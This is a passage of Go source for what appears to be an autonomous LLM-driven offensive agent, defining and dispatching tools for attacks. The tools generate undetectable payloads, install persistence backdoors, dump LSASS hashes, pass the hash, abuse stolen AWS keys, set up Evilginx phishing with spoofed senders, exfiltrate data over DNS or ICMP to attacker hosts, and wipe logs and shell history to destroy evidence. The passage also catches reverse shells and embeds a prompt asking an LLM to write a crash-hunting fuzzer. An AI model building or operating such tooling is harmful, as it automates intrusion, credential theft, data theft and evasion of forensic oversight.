		Name: "generate_fud_payload", Description: openai.String("Generate a Fully Undetectable (FUD) payload using dynamic compilation, encryption, and syscall unhooking."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"lhost":  map[string]interface{}{"type": "string", "description": "Callback IP"},
			"lport":  map[string]interface{}{"type": "integer", "description": "Callback port"},
			"format": map[string]interface{}{"type": "string", "description": "Output format: exe, dll, ps1, elf"},
		}, "required": []string{"lhost", "lport", "format"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "auto_privesc", Description: openai.String("Automatically execute privilege escalation enumeration on a compromised shell: LinPEAS in-memory (Linux) or WinPEAS disk-resident/AMSI-safe plus a saved-credential hunt (Windows)."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"session_id": map[string]interface{}{"type": "string", "description": "Active shell session ID"},
			"os_type":    map[string]interface{}{"type": "string", "description": "linux or windows"},
		}, "required": []string{"session_id", "os_type"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "establish_persistence", Description: openai.String("Install a quiet backdoor to maintain access."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"session_id": map[string]interface{}{"type": "string", "description": "Active shell session ID"},
			"method":     map[string]interface{}{"type": "string", "description": "cron, registry, wmi, ssh_key"},
		}, "required": []string{"session_id", "method"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "aws_enum_iam", Description: openai.String("Enumerate AWS IAM permissions using Pacu with a compromised access key."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"access_key": map[string]interface{}{"type": "string", "description": "AWS Access Key"},
			"secret_key": map[string]interface{}{"type": "string", "description": "AWS Secret Key"},
		}, "required": []string{"access_key", "secret_key"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "aws_escalate_privs", Description: openai.String("Attempt automated privilege escalation on AWS IAM."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"access_key": map[string]interface{}{"type": "string", "description": "AWS Access Key"},
		}, "required": []string{"access_key"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "aws_dump_s3", Description: openai.String("Enumerate and download sensitive data from S3 buckets."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"access_key": map[string]interface{}{"type": "string", "description": "AWS Access Key"},
		}, "required": []string{"access_key"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "setup_phish_domain", Description: openai.String("Configure Evilginx2 to clone a target login page for MFA bypass."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"domain_name": map[string]interface{}{"type": "string", "description": "Your malicious domain"},
			"target_site": map[string]interface{}{"type": "string", "description": "Target platform (e.g. o365, okta, github)"},
		}, "required": []string{"domain_name", "target_site"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "generate_phish_email", Description: openai.String("Generate a tailored spear-phishing email body."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"target_profile": map[string]interface{}{"type": "string", "description": "OSINT data about the target"},
		}, "required": []string{"target_profile"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "send_phish", Description: openai.String("Send the generated phishing email to the target through the SMTP relay."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"target_email": map[string]interface{}{"type": "string", "description": "Target email address"},
			"template":     map[string]interface{}{"type": "string", "description": "Email content"},
			"smtp_server":  map[string]interface{}{"type": "string", "description": "Optional SMTP relay endpoint (default 127.0.0.1:25)"},
			"sender_email": map[string]interface{}{"type": "string", "description": "Optional spoofed sender address"},
		}, "required": []string{"target_email", "template"}},
	}})

	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "ad_dump_lsass", Description: openai.String("Dump NT hashes and cached credentials from a target Windows machine using secretsdump.py over SMB. Requires valid credentials (password or NTLM hash)."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"target":    map[string]interface{}{"type": "string", "description": "Target hostname or IP"},
			"user":      map[string]interface{}{"type": "string", "description": "Username for authentication"},
			"domain":    map[string]interface{}{"type": "string", "description": "Domain (use '.' for local)"},
			"password":  map[string]interface{}{"type": "string", "description": "Plaintext password (if not using hash)"},
			"ntlm_hash": map[string]interface{}{"type": "string", "description": "NTLM hash for pass-the-hash (LM:NT or NT only)"},
		}, "required": []string{"target", "user"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "ad_pass_the_hash", Description: openai.String("Automate lateral movement using an extracted NTLM hash via impacket."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"target_ip": map[string]interface{}{"type": "string", "description": "Target IP address"},
			"user":      map[string]interface{}{"type": "string", "description": "Username"},
			"hash":      map[string]interface{}{"type": "string", "description": "NTLM Hash"},
			"command":   map[string]interface{}{"type": "string", "description": "Command to execute"},
		}, "required": []string{"target_ip", "user", "hash", "command"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "ad_bloodhound_collect", Description: openai.String("Deploy bloodhound-python to map out the AD domain topology."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"domain":   map[string]interface{}{"type": "string", "description": "Target domain"},
			"dc_ip":    map[string]interface{}{"type": "string", "description": "Domain Controller IP"},
			"username": map[string]interface{}{"type": "string", "description": "Valid username"},
			"password": map[string]interface{}{"type": "string", "description": "Valid password (optional)"},
			"hash":     map[string]interface{}{"type": "string", "description": "NTLM Hash (optional)"},
		}, "required": []string{"domain", "dc_ip", "username"}},
	}})

	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "exfil_compress_encrypt", Description: openai.String("Compress and encrypt a file/folder with AES-256 to evade DLP engines."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"source_path": map[string]interface{}{"type": "string", "description": "Path to data"},
			"dest_path":   map[string]interface{}{"type": "string", "description": "Where to save the encrypted archive"},
			"password":    map[string]interface{}{"type": "string", "description": "AES-256 password"},
		}, "required": []string{"source_path", "dest_path", "password"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "exfil_dns_tunnel", Description: openai.String("Stealthily exfiltrate a file by breaking it into chunks and tunneling via DNS queries."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"file_path":     map[string]interface{}{"type": "string", "description": "Path to payload"},
			"target_domain": map[string]interface{}{"type": "string", "description": "Attacker controlled domain"},
		}, "required": []string{"file_path", "target_domain"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "exfil_icmp_ping", Description: openai.String("Stealthily exfiltrate a file by embedding it into ICMP Ping payload bytes."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"file_path": map[string]interface{}{"type": "string", "description": "Path to payload"},
			"target_ip": map[string]interface{}{"type": "string", "description": "Attacker IP address"},
		}, "required": []string{"file_path", "target_ip"}},
	}})

	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "ghost_wipe_logs", Description: openai.String("Wipe Windows Event Logs or Linux Audit/Syslogs to destroy forensic evidence."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"os_type": map[string]interface{}{"type": "string", "description": "'windows' or 'linux'"},
		}, "required": []string{"os_type"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "ghost_secure_delete", Description: openai.String("Securely overwrite and shred a dropped payload or script on disk."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"file_path": map[string]interface{}{"type": "string", "description": "Path to file"},
			"os_type":   map[string]interface{}{"type": "string", "description": "'windows' or 'linux'"},
		}, "required": []string{"file_path", "os_type"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "ghost_clear_history", Description: openai.String("Wipe bash/zsh history or PowerShell PSReadLine history to hide commands."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"os_type": map[string]interface{}{"type": "string", "description": "'windows' or 'linux'"},
		}, "required": []string{"os_type"}},
	}})

	defs = append(defs, openai.ChatCompletionToolParam{
		Type: "function",
		Function: openai.FunctionDefinitionParam{
			Name:        "run_sast",
			Description: openai.String("Static analysis (SAST) of a local code tree for authorized code review. Scans source files for vulnerability patterns (SQLi, command injection, XSS sinks, insecure deserialization, hardcoded secrets) and returns candidates with file:line provenance."),
			Parameters: openai.FunctionParameters{
				"type": "object",
				"properties": map[string]interface{}{
					"path":   map[string]interface{}{"type": "string", "description": "Local directory or file to scan"},
					"target": map[string]interface{}{"type": "string", "description": "Alias for path"},
				},
				"required": []string{"path"},
			},
		},
	})

	defs = append(defs, openai.ChatCompletionToolParam{
		Type: "function",
		Function: openai.FunctionDefinitionParam{
			Name:        "web_probe",
			Description: openai.String("Lightweight DAST probe of an authorized web target: discovers input parameters, detects reflected-XSS candidates, and flags forms missing anti-CSRF tokens. Findings are candidates requiring browser validation."),
			Parameters: openai.FunctionParameters{
				"type": "object",
				"properties": map[string]interface{}{
					"url": map[string]interface{}{"type": "string", "description": "Target URL (authorized only)"},
				},
				"required": []string{"url"},
			},
		},
	})

	defs = append(defs, openai.ChatCompletionToolParam{
		Type: "function",
		Function: openai.FunctionDefinitionParam{
			Name:        "replay_request",
			Description: openai.String("Send a crafted HTTP request to an authorized target and return the status code and body for proof-of-concept validation."),
			Parameters: openai.FunctionParameters{
				"type": "object",
				"properties": map[string]interface{}{
					"url":     map[string]interface{}{"type": "string", "description": "Target URL"},
					"method":  map[string]interface{}{"type": "string", "description": "HTTP method (default GET)"},
					"headers": map[string]interface{}{"type": "string", "description": "JSON object of request headers"},
					"body":    map[string]interface{}{"type": "string", "description": "Request body"},
				},
				"required": []string{"url"},
			},
		},
	})

	defs = append(defs, openai.ChatCompletionToolParam{
		Type: "function",
		Function: openai.FunctionDefinitionParam{
			Name:        "browser_validate",
			Description: openai.String("Browser-driven XSS confirmation using headless Chromium (Playwright) against an authorized target. Confirms a reflected-XSS candidate actually executes in a real browser. Requires Playwright/Chromium in the sandbox (install: pip install playwright && playwright install chromium, or pass autoinstall=true)."),
			Parameters: openai.FunctionParameters{
				"type": "object",
				"properties": map[string]interface{}{
					"url":         map[string]interface{}{"type": "string", "description": "Target URL"},
					"param":       map[string]interface{}{"type": "string", "description": "The reflected parameter to inject the payload into"},
					"payload":     map[string]interface{}{"type": "string", "description": "Optional XSS payload (default triggers a title marker)"},
					"autoinstall": map[string]interface{}{"type": "boolean", "description": "If true, attempt to install Playwright/Chromium in the sandbox"},
				},
				"required": []string{"url"},
			},
		},
	})

	defs = append(defs, openai.ChatCompletionToolParam{
		Type: "function",
		Function: openai.FunctionDefinitionParam{
			Name:        "source_review",
			Description: openai.String("Static analysis (SAST) of a source file or directory for vulnerability sinks (injection, SSTI, insecure deserialization, weak crypto, disabled TLS). Prefers semgrep when available, else a built-in pattern scanner."),
			Parameters: openai.FunctionParameters{
				"type": "object",
				"properties": map[string]interface{}{
					"target": map[string]interface{}{"type": "string", "description": "Path to a file or directory to review"},
				},
				"required": []string{"target"},
			},
		},
	})

	// Cache the definitions for reuse
	r.cachedDefs = defs
	return defs
}

// Execute dispatches a tool call by name.
func (r *ToolRegistry) Execute(ctx context.Context, name string, argsJSON string) string {
	var args map[string]any
	if err := json.Unmarshal([]byte(argsJSON), &args); err != nil {
		return fmt.Sprintf("[Tool Error] Failed to parse arguments: %v", err)
	}

	if blocked := r.gateToolExecution(name, args); blocked != "" {
		return blocked
	}

	// Builtins take priority
	if fn, ok := r.builtins[name]; ok {
		result := fn(ctx, args)
		r.recordToolEvidence(name, result)
		r.lastTarget = extractTarget(args)
		r.lastResult = r.classifyOutcome(name, result, nil)
		return result
	}

	// All manifest skills ultimately execute via docker shell
	cmd, _ := args["command"].(string)
	if cmd == "" {
		// Build command from skill name + args
		cmd = buildSkillCommand(name, args)
	}

	result, err := r.sandbox.Execute(ctx, cmd)
	if err != nil {
		r.lastTarget = extractTarget(args)
		r.lastResult = r.classifyOutcome(name, fmt.Sprintf("[%s Error] %v", r.executionModeLabel(), err), err)
		return fmt.Sprintf("[%s Error] %v", r.executionModeLabel(), err)
	}
	r.recordToolEvidence(name, result)
	r.lastTarget = extractTarget(args)
	r.lastResult = r.classifyOutcome(name, result, err)
	return result
}

func (r *ToolRegistry) gateToolExecution(name string, args map[string]any) string {
	if name == "shell_execute" {
		cmd, _ := args["command"].(string)
		lower := strings.ToLower(cmd)
		if strings.Contains(lower, "subfinder") {
			return "[Blocked] Use the dedicated wrapper 'run_subfinder' instead of shell_execute for subdomain enumeration — it has correct flags and timeout handling."
		}
		if strings.Contains(lower, "nmap") || strings.Contains(lower, "nuclei") || strings.Contains(lower, "gobuster") || strings.Contains(lower, "ffuf") || strings.Contains(lower, "sqlmap") || strings.Contains(lower, "httpx") {
			return "[Blocked] Use the dedicated wrapper for this tool (run_nmap, run_nuclei, run_gobuster, run_ffuf, run_sqlmap, run_httpx) instead of shell_execute."
		}
		if !isActiveShellCommand(args) {
			return ""
		}
	}

	policy := classifyToolPolicy(name)
	if policy == toolPolicyObserve || policy == toolPolicyUtility {
		return ""
	}

	snapshot := r.evidenceSnapshot(args)
	if policy == toolPolicyActive && snapshot.hasTargetEvidence() {
		return ""
	}
	if policy == toolPolicyCredentialed && snapshot.hasTargetEvidence() && snapshot.hasCredentialOrSessionEvidence() {
		return ""
	}
	if policy == toolPolicyPostAccess && snapshot.hasPostAccessEvidence() {
		return ""
	}

	return snapshot.blockMessage(name, policy)
}

type toolPolicy string

const (
	toolPolicyObserve      toolPolicy = "observe"
	toolPolicyUtility      toolPolicy = "utility"
	toolPolicyActive       toolPolicy = "active"
	toolPolicyCredentialed toolPolicy = "credentialed"
	toolPolicyPostAccess   toolPolicy = "post_access"
)

func classifyToolPolicy(name string) toolPolicy {
	switch {
	case name == "update_neural_memory" || name == "save_document" || name == "ask_operator":
		return toolPolicyUtility
	case strings.HasPrefix(name, "osint_") ||
		name == "profile_target" || name == "web_search" || name == "fetch_url" ||
		name == "deep_research" || name == "lookup_cve" || name == "binary_recon" ||
		name == "analyze_source_code" || name == "binary_gdb_run" || name == "run_sast" ||
		name == "run_attack_plan" || name == "run_sliver":
		return toolPolicyObserve
	case name == "download_loot" || name == "shell_session_exec" || name == "deploy_pivot" ||
		name == "route_traffic" || name == "auto_privesc" || name == "establish_persistence" ||
		name == "exfil_compress_encrypt" || name == "exfil_dns_tunnel" || name == "exfil_icmp_ping" ||
		name == "ghost_wipe_logs" || name == "ghost_secure_delete" || name == "ghost_clear_history":
		return toolPolicyPostAccess
	case name == "ad_dump_lsass" || name == "ad_pass_the_hash" || name == "aws_enum_iam" ||
		name == "aws_escalate_privs" || name == "aws_dump_s3" || name == "send_phish":
		return toolPolicyCredentialed
	case name == "shell_execute" || name == "run_exploit" || name == "run_ad_template" ||
		name == "auth_bypass_scan" || name == "binary_ret2libc" || name == "fuzz_endpoint" ||
		name == "generate_fud_payload" || name == "setup_phish_domain" || name == "browser_validate" ||
		name == "autonomous_fuzzing_engine" || name == "autonomous_exploit_writer" ||
		name == "autonomous_ad_exploiter" || name == "dynamic_payload_compiler" ||
		name == "swarm_pivot_orchestrator" || name == "advanced_web_exploiter" ||
		name == "headless_browser_automation" || name == "zero_click_exploiter" ||
		name == "async_race_condition_engine":
		return toolPolicyActive
	default:
		if strings.HasPrefix(name, "run_") || strings.HasPrefix(name, "ad_") {
			return toolPolicyActive
		}
		return toolPolicyUtility
	}
}

func isActiveShellCommand(args map[string]any) bool {
	cmd, _ := args["command"].(string)
	cmd = strings.ToLower(strings.TrimSpace(cmd))
	if cmd == "" {
		return false
	}
	inspectionPrefixes := []string{
		"pwd", "ls", "cat ", "head ", "tail ", "grep ", "rg ", "find ",
		"file ", "strings ", "nm ", "ldd ", "checksec", "whois ", "dig ",
		"nslookup ", "curl -i", "curl -I", "git ", "python -c", "python3 -c",
	}
	for _, prefix := range inspectionPrefixes {
		if strings.HasPrefix(cmd, prefix) {
			return false
		}
	}
	activeMarkers := []string{
		"nmap ", "sqlmap ", "hydra ", "msfconsole", "nc ", "netcat ", "ffuf ",
		"gobuster ", "nuclei ", "nikto ", "ssh ", "scp ", "smbclient ", "impacket",
		"evilginx", "chisel ", "ligolo", "wget ", "curl ", "python ", "python3 ",
		"bash ", "sh ", "powershell", "./", "chmod +x",
	}
	for _, marker := range activeMarkers {
		if strings.Contains(cmd, marker) {
			return true
		}
	}
	return false
}

type evidenceSnapshot struct {
	targetArgs         []string
	credentialArgs     []string
	sessionArgs        []string
	targetNodes        int
	serviceNodes       int
	vulnerabilityNodes int
	credentialNodes    int
	recentEvidence     []toolEvidence
}

func (r *ToolRegistry) evidenceSnapshot(args map[string]any) evidenceSnapshot {
	s := evidenceSnapshot{
		targetArgs:     extractArgs(args, "target", "target_ip", "targetIp", "url", "domain", "host", "hostname", "subnet", "dc_ip", "target_email"),
		credentialArgs: extractArgs(args, "user", "username", "password", "hash", "access_key", "secret_key", "session_id"),
		sessionArgs:    extractArgs(args, "session_id", "remote_path"),
		recentEvidence: append([]toolEvidence(nil), r.recentEvidence...),
	}
	if r.graph == nil {
		return s
	}
	for _, node := range r.graph.GetNodes() {
		switch node.Label {
		case memory.LabelTarget, memory.LabelAsset, memory.LabelPort:
			s.targetNodes++
		case memory.LabelService:
			s.serviceNodes++
		case memory.LabelVulnerability:
			s.vulnerabilityNodes++
		case memory.LabelCredential:
			s.credentialNodes++
		}
	}
	return s
}

func (s evidenceSnapshot) hasTargetEvidence() bool {
	return len(s.targetArgs) > 0 || s.targetNodes > 0 || s.serviceNodes > 0 || s.vulnerabilityNodes > 0 || len(s.recentEvidence) > 0
}

func (s evidenceSnapshot) hasCredentialOrSessionEvidence() bool {
	return len(s.credentialArgs) > 0 || s.credentialNodes > 0
}

func (s evidenceSnapshot) hasPostAccessEvidence() bool {
	return len(s.sessionArgs) > 0 || s.credentialNodes > 0 || hasRecentShellEvidence(s.recentEvidence)
}

func (s evidenceSnapshot) blockMessage(name string, policy toolPolicy) string {
	switch policy {
	case toolPolicyActive:
		return fmt.Sprintf("[Blocked] Evidence gate denied '%s'. Collect target evidence first with recon or profiling, or provide an explicit target argument.", name)
	case toolPolicyCredentialed:
		return fmt.Sprintf("[Blocked] Evidence gate denied '%s'. This action requires verified target evidence plus credential or session context.", name)
	case toolPolicyPostAccess:
		return fmt.Sprintf("[Blocked] Evidence gate denied '%s'. This action requires verified post-access context such as a session, credential, or recent shell evidence.", name)
	default:
		return ""
	}
}

func extractArgs(args map[string]any, keys ...string) []string {
	var out []string
	for _, key := range keys {
		v, ok := args[key]
		if !ok {
			continue
		}
		switch x := v.(type) {
		case string:
			if strings.TrimSpace(x) != "" {
				out = append(out, x)
			}
		case float64:
			if x != 0 {
				out = append(out, fmt.Sprintf("%.0f", x))
			}
		}
	}
	return out
}

func hasRecentShellEvidence(items []toolEvidence) bool {
	cutoff := time.Now().Add(-15 * time.Minute)
	for _, item := range items {
		if item.Timestamp.Before(cutoff) {
			continue
		}
		if item.Tool == "catch_shell" || item.Tool == "shell_session_exec" || strings.Contains(strings.ToLower(item.Summary), "session id") {
			return true
		}
	}
	return false
}

func (r *ToolRegistry) recordToolEvidence(name, result string) {
	if result == "" {
		return
	}
	lower := strings.ToLower(result)
	if strings.Contains(lower, "[error]") || strings.Contains(lower, "[blocked]") || strings.Contains(lower, "[rejected]") {
		return
	}
	r.recentEvidence = append(r.recentEvidence, toolEvidence{
		Tool:      name,
		Summary:   truncateToolEvidence(result, 220),
		Timestamp: time.Now(),
	})
	if len(r.recentEvidence) > 12 {
		r.recentEvidence = r.recentEvidence[len(r.recentEvidence)-12:]
	}
}

func truncateToolEvidence(result string, limit int) string {
	result = strings.Join(strings.Fields(strings.ReplaceAll(result, "\n", " ")), " ")
	if len(result) <= limit {
		return result
	}
	return result[:limit-3] + "..."
}

func (r *ToolRegistry) executionModeLabel() string {
	if r.sandbox == nil || r.sandbox.IsNativeMode() {
		return "Native"
	}
	return "Sandbox"
}

func (r *ToolRegistry) registerBuiltins() {
	// Register all Phase 2 structured tool wrappers
	r.registerToolWrappers()
	r.registerWebTools()

	r.builtins["shell_execute"] = func(ctx context.Context, args map[string]any) string {
		cmd, _ := args["command"].(string)
		if cmd == "" {
			return "[Error] No command provided"
		}
		lowerCmd := strings.ToLower(strings.TrimSpace(cmd))
		if strings.HasPrefix(lowerCmd, "echo \"waiting") || strings.HasPrefix(lowerCmd, "echo 'waiting") || lowerCmd == "echo \"waiting for tool results...\"" || lowerCmd == "echo \"fetching results...\"" || lowerCmd == "echo \"waiting for results...\"" || strings.Contains(lowerCmd, "waiting for tool") {
			return "[Hint] No need to echo waiting messages — the tool output is already returned. Proceed directly to the next reconnaissance or exploitation step."
		}

		if cached, ok := r.recentCommands[cmd]; ok && time.Since(cached.executed) < shellDedupWindow {
			return "[Dedup] Same shell_execute call already ran within the last 60s. Reusing prior result:\n" + cached.result
		}

		result, err := r.sandbox.Execute(ctx, cmd)
		if err != nil {
			return fmt.Sprintf("[%s Error] %v", r.executionModeLabel(), err)
		}
		r.recentCommands[cmd] = recentCmd{result: result, executed: time.Now()}
		if len(r.recentCommands) > maxRecentCommands {
			oldest := cmd
			oldestTime := time.Now()
			for k, v := range r.recentCommands {
				if v.executed.Before(oldestTime) {
					oldestTime = v.executed
					oldest = k
				}
			}
			delete(r.recentCommands, oldest)
		}
		return result
	}

	r.builtins["health_status"] = func(ctx context.Context, args map[string]any) string {
		return r.systemDiagnostics(ctx)
	}

	r.builtins["python_execute"] = func(ctx context.Context, args map[string]any) string {
		script, _ := args["script"].(string)
		if script == "" {
			return "[Error] No script provided"
		}

		tmpFile, err := os.CreateTemp("", "drogonclaw-python-*.py")
		if err != nil {
			return fmt.Sprintf("[Error] Failed to create temp file: %v", err)
		}
		tmpPath := tmpFile.Name()
		_ = tmpFile.Close()

		if werr := os.WriteFile(tmpPath, []byte(script), 0644); werr != nil {
			os.Remove(tmpPath)
			return fmt.Sprintf("[Error] Failed to write script: %v", werr)
		}

		timeoutSecs := 60
		if t, ok := args["timeout_seconds"].(float64); ok {
			timeoutSecs = int(t)
		}

		cmd := fmt.Sprintf("python3 %s", tmpPath)
		if timeoutSecs > 0 {
			cmd = fmt.Sprintf("timeout %d %s", timeoutSecs, cmd)
		}

		result, err := r.sandbox.Execute(ctx, cmd)
		os.Remove(tmpPath)

		if err != nil {
			return fmt.Sprintf("[%s Error] %v", r.executionModeLabel(), err)
		}
		return result
	}

	r.builtins["update_neural_memory"] = func(ctx context.Context, args map[string]any) string {
		id := coerceStringArg(args, "id")
		label := coerceStringArg(args, "label")
		dataRaw := args["data"]
		data := coerceDataToString(dataRaw)
		sourceID := coerceStringArg(args, "source_id")
		targetID := coerceStringArg(args, "target_id")
		relationship := coerceStringArg(args, "relationship")
		if label == "" {
			return "[Error] label is required (e.g. Target, Asset, Port, Service, Vulnerability, Credential, Flag)"
		}
		// Auto-generate an id when the model does not supply one, so recording
		// a finding never fails on a missing id. Deterministic per (label+data)
		// so the same fact is not duplicated across turns.
		if id == "" {
			sum := sha256.Sum256([]byte(label + "|" + data))
			id = fmt.Sprintf("%s-%x", strings.ToLower(label), sum[:6])
		}

		// Operator identity comes from the human directly, never from tool
		// output, so it is exempt from evidence validation. Everything else
		// is verified against the most recent observation.
		if !strings.EqualFold(label, "operator") && r.validator != nil && len(r.recentEvidence) > 0 {
			latest := r.recentEvidence[len(r.recentEvidence)-1]
			valRes, err := r.validator.Validate(ctx, latest.Tool, latest.Summary, data)
			if err == nil && !valRes.IsValid {
				return fmt.Sprintf("[Rejected] The Evidence Validator rejected this finding: %s. Please re-verify.", valRes.Reasoning)
			}
		}

		// Insert into Loot DB if applicable
		if r.lootDb != nil {
			switch label {
			case "Port":
				_ = r.lootDb.InsertPort(id, 0, data, "")
			case "Credential":
				_ = r.lootDb.InsertCredential(id, "", data, "")
			case "Vulnerability":
				_ = r.lootDb.InsertVulnerability(id, "", data, "")
			}
		}

		// Update Operator Profile if memory graph is available
		if r.graph != nil && strings.ToLower(label) == "operator" {
			name := operatorNameFromData(data)
			r.graph.UpdateOperatorProfile(&memory.OperatorProfile{Name: name})
			return fmt.Sprintf("[Memory] Acknowledged Operator identity: %s. The prompt will now reflect this.", name)
		}

		if r.graph != nil {
			properties := parseMemoryProperties(data)
			r.graph.AddNode(&memory.Node{
				ID:         id,
				Label:      memory.NodeLabel(label),
				Properties: properties,
			})
			edges := buildMemoryEdges(id, label, properties, sourceID, targetID, relationship)
			for _, edge := range edges {
				r.graph.AddEdge(edge)
			}
			if len(edges) > 0 {
				return fmt.Sprintf("[Memory] Stored %s node '%s' with %d relationship(s)", label, id, len(edges))
			}
		}

		return fmt.Sprintf("[Memory] Stored %s node '%s': %s", label, id, data)
	}

	r.builtins["catch_shell"] = func(ctx context.Context, args map[string]any) string {
		portRaw, _ := args["port"].(float64)
		port := int(portRaw)
		if port == 0 {
			port = 4444
		}
		sessionID, err := r.shells.Listen(port)
		if err != nil {
			return fmt.Sprintf("[Shell Error] %v", err)
		}
		return fmt.Sprintf("[Shell] Reverse shell caught! Session ID: %s — Remote: %s",
			sessionID, func() string {
				if s, ok := r.shells.Get(sessionID); ok {
					return s.RemoteAddr
				}
				return "unknown"
			}())
	}

	r.builtins["shell_session_exec"] = func(ctx context.Context, args map[string]any) string {
		sessionID, _ := args["session_id"].(string)
		cmd, _ := args["command"].(string)
		if sessionID == "" || cmd == "" {
			return "[Error] session_id and command are required"
		}
		sess, ok := r.shells.Get(sessionID)
		if !ok {
			return fmt.Sprintf("[Error] Session '%s' not found. Use catch_shell first.", sessionID)
		}
		out, err := sess.Send(cmd)
		if err != nil {
			return fmt.Sprintf("[Shell Error] %v", err)
		}
		return out
	}

	r.builtins["download_loot"] = func(ctx context.Context, args map[string]any) string {
		remotePath, _ := args["remote_path"].(string)
		if remotePath == "" {
			return "[Error] remote_path is required"
		}
		lootDir, err := core.LootDir()
		if err != nil {
			return fmt.Sprintf("[Loot Error] %v", err)
		}
		filename := filepath.Base(remotePath)
		dest := filepath.Join(lootDir, filename)
		size, err := r.sandbox.CopyFile(ctx, remotePath, dest)
		if err != nil {
			return fmt.Sprintf("[Loot Error] Failed to download '%s': %v", remotePath, err)
		}
		return fmt.Sprintf("[Loot] Saved '%s' to %s (%d bytes). File contents NOT shown to preserve context.", filename, dest, size)
	}

	r.builtins["save_document"] = func(ctx context.Context, args map[string]any) string {
		title, _ := args["title"].(string)
		format, _ := args["format"].(string)
		content, _ := args["content"].(string)
		directory, _ := args["directory"].(string)
		if title == "" || format == "" || content == "" {
			return "[Error] title, format, and content are required"
		}
		path, err := core.SaveDocument(title, content, format, directory)
		if err != nil {
			return fmt.Sprintf("[Document Error] %v", err)
		}
		return fmt.Sprintf("[Document] Saved %s document to %s", strings.ToUpper(strings.TrimPrefix(format, ".")), path)
	}

	r.builtins["autonomous_fuzzing_engine"] = func(ctx context.Context, args map[string]any) string {
		targetIp, _ := args["targetIp"].(string)
		targetPortRaw, _ := args["targetPort"].(float64)
		targetPort := int(targetPortRaw)
		protocol, _ := args["protocol"].(string)
		fuzzingDepthRaw, _ := args["fuzzingDepth"].(float64)
		fuzzingDepth := int(fuzzingDepthRaw)

		if targetIp == "" || targetPort == 0 || protocol == "" {
			return "[Error] targetIp, targetPort, and protocol are required"
		}
		if fuzzingDepth == 0 {
			fuzzingDepth = 5
		}

		if r.provider == nil {
			return "[Fuzzing Error] LLM provider not available for dynamic script generation."
		}

		prompt := fmt.Sprintf(`You are an elite autonomous vulnerability researcher writing a zero-day fuzzing script in Python 3.
Target: %s:%d
Protocol: %s

Write a highly aggressive, protocol-aware fuzzer. 
REQUIREMENTS:
1. It must connect to the target and fire payloads. If it's HTTP, send malformed HTTP requests (headers, body, URI). If raw TCP/UDP, send malformed byte arrays.
2. Implement advanced mutations: massive buffer overflows (10,000+ bytes of 'A'), format string injections (%%x%%n), and random bitflips.
3. Catch connection errors (ConnectionReset, Timeout). If the target crashes, print exactly which payload caused the crash and exit.
4. Execute a maximum of %d iterations (safety limit to prevent infinite loops).
	5. Output ONLY the raw Python 3 code. No markdown formatting (e.g. a python code fence). No explanations.

OUTPUT ONLY VALID PYTHON SOURCE CODE.`, targetIp, targetPort, protocol, fuzzingDepth*50)

		messages := []openai.ChatCompletionMessageParamUnion{
			openai.UserMessage(prompt),
		}

		fuzzerScript, err := r.provider.CompleteText(ctx, messages)
		if err != nil {
			return fmt.Sprintf("[Fuzzing Engine Error] Failed to generate fuzzer script: %v", err)
		}

		// Clean up accidental markdown
		fuzzerScript = regexp.MustCompile(`(?i)^`+"`"+`{3}[a-z]*\n`).ReplaceAllString(fuzzerScript, "")
		fuzzerScript = regexp.MustCompile(`(?i)\n`+"`"+`{3}$`).ReplaceAllString(fuzzerScript, "")

